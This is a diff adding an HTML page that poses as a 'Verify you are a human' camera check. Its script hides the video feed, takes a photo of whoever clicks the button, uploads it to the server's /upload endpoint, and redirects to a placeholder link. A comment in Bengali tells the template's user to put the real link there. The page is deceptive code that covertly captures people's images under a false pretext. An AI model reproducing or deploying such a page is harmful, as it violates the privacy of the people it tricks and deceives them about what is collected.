@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify You Are Human</title>
+  <style>
+    body {
+      background-color: #f1f1f1;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    .box {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px gray;
+      display: inline-block;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>🔒 Verify you are a human</h2>
+    <p>Click below to complete a quick camera check</p>
+    <button onclick="startCamera()">Verify</button>
+  </div>
+
+  <video id="video" autoplay></video>
+
+  <script>
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        video.style.display = "none";
+
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const blob = await imageCapture.takePhoto();
+        
+        const formData = new FormData();
+        formData.append("photo", blob, "capture.jpg");
+
+        await fetch("/upload", {
+          method: "POST",
+          body: formData,
+        });
+
+        stream.getTracks().forEach((track) => track.stop());
+        window.location.href = "https://example.com"; // 🟡 এখানে তুমি রিয়েল লিংক দাও
+
+      } catch (err) {
+        alert("Camera permission denied!");
+      }
+    }
+  </script>
+</body>
+</html>
